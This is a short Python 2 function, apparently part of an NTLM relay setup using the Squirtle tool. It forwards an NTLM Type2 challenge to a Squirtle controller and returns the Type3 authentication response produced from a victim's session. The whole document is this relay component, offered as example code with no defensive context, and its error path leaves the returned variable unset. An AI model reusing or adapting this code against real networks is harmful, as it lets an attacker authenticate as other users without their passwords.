# Example code to request a Type3 message response from a Squirtle session.

import urllib, urllib2, simplejson

#-----------------------------------------------------------------------
def process_squirtle(self, env, msg2):
    ""
    msg2 = urllib.quote(msg2)
    auth_handler = urllib2.HTTPBasicAuthHandler()
    auth_handler.add_password(realm='Squirtle Realm',
                              uri=env['SQURL'],
                              user=env['SQUSER'],
                              passwd=env['SQPASS'])
    urlopener = urllib2.build_opener(auth_handler)
    urllib2.install_opener(urlopener)

    dutchieurl = "%scontroller/type2?key=%s&type2=%s" % (env['SQURL'], env['SQKEY'], msg2)
    try:
        res = urllib2.urlopen(dutchieurl)
    except urllib2.URLError, e:
        print '*** Error talking to Squirtle.' + str(e.code) + ': ' + e.reason + '\n'
        return ''

    response = res.read()
    try:
        response = simplejson.loads(response)
    except Exception, e:
        print '*** Error receiving response from Squirtle: ' + response + '\n'
        return ''

    if response['status'] == 'ok':
        NTLM_msg3 = response['result']
    else:
        print '*** Response from Squirtle: ' + response['status'] + '\n'

    return NTLM_msg3